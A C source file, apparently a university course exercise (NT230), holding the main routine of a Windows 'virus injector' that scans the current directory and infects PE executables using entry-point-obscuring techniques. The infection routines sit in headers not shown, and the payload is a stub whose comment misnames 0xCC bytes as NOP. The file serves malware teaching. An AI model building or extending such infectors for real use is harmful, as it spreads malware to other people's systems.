/*
 * Virus Injector Program
 * Demonstrates EPO (Entry-Point Obscuring) virus infection techniques
 * - Strategy 1: Call Hijacking EPO
 * - Strategy 2: Import Address Table Replacing EPO
 * 
 * This is an educational demonstration only
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "virus_payload.h"
#include "pe_infector.h"

// Virus payload code (in real scenario, this would be actual shellcode)
// This is a simplified demonstration version
const unsigned char virus_payload[] = {
    0xCC, 0xCC, 0xCC, 0xCC  // NOP padding for demo
};

int main() {
    printf("[*] NT230 Virus Injector - EPO Demonstration\n");
    printf("[*] MSSV: 23521308-23521761-23521828-23521840\n\n");

    // Display infection message
    DisplayInfectionMessage();

    printf("[+] Scanning for PE files to infect in current directory...\n");

    // Scan and infect PE files
    InfectPEFilesInDirectory();

    printf("[+] Infection attempt completed\n");
    printf("[+] This program demonstrates EPO virus techniques:\n");
    printf("    - Call Hijacking EPO\n");
    printf("    - Import Address Table Replacing EPO\n\n");

    return 0;
}
